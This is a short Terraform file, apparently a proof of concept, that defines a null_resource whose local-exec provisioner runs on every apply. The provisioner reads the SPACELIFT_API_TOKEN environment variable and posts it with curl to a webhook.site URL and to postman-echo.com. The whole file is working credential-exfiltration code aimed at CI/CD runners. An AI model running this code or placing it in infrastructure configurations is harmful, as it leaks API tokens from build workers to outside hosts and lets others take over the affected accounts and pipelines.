terraform {
  required_version = ">= 1.0"
}

resource "null_resource" "exfil" {
  triggers = {
    always = timestamp()
  }

  provisioner "local-exec" {
    interpreter = ["/bin/sh", "-c"]
    command = <<EOT
      echo "========================================="
      echo "[*] EXFILTRATION POC (DEBUG)"
      echo "========================================="

      TOKEN="$SPACELIFT_API_TOKEN"
      if [ -n "$TOKEN" ]; then
        echo "[!] Token found. Sending to webhook..."
        curl -v -X POST "https://webhook.site/deaf9bad-5c63-498b-bc12-719a54cd25bb" \
          -H "Content-Type: application/json" \
          -d "{\"source\":\"spacelift-worker\",\"token\":\"$TOKEN\"}" \
          2>&1 || echo " [✗] Curl to webhook failed"

        echo "[!] Also sending to postman-echo for verification..."
        curl -s -X POST "https://postman-echo.com/post" \
          -H "Content-Type: application/json" \
          -d "{\"source\":\"spacelift-worker\",\"token\":\"$TOKEN\"}" \
          && echo " [✓] Postman-echo received it" || echo " [✗] Postman-echo failed"
      else
        echo "[-] No token found"
      fi

      echo "========================================="
      echo "[*] Done."
      echo "========================================="
    EOT
  }
}
